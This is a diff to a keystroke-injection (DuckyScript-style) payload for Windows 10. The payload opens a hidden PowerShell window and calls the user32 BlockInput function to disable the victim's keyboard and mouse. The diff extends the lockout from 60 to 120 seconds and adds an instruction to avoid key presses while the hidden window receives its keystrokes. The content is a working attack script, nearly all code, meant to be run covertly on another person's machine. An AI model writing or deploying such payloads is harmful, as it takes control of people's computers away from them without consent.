@@ -1,6 +1,7 @@
-REM Title: Disable Keyboard and Mouse 60s
+REM Title: Disable Keyboard and Mouse 120s
 REM Author: @beigeworm | https://github.com/beigeworm
-REM Description: Uses Powershell to disable all i/o devices for 60 seconds.
+REM Description: Uses Powershell to disable all i/o devices for 120 seconds.
+REM Description: DO NOT PRESS KEYS FOR UP TO 10 SECONDS AFTER POWERSHELL OPENS (to allow keystrokes for payload into hidden window)
 REM Target: Windows 10
 
 REM *REQUIREMENTS*
@@ -20,5 +21,5 @@ DELAY 5000
 
 REM write out the main Powershell code.
 STRING $s = '[DllImport("user32.dll")][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
-STRING ;Add-Type -M $s -Name U -Names W;[W.U]::BlockInput($true);sleep 60;[W.U]::BlockInput($false)
+STRING ;Add-Type -M $s -Name U -Names W;[W.U]::BlockInput($true);sleep 120;[W.U]::BlockInput($false)
 ENTER
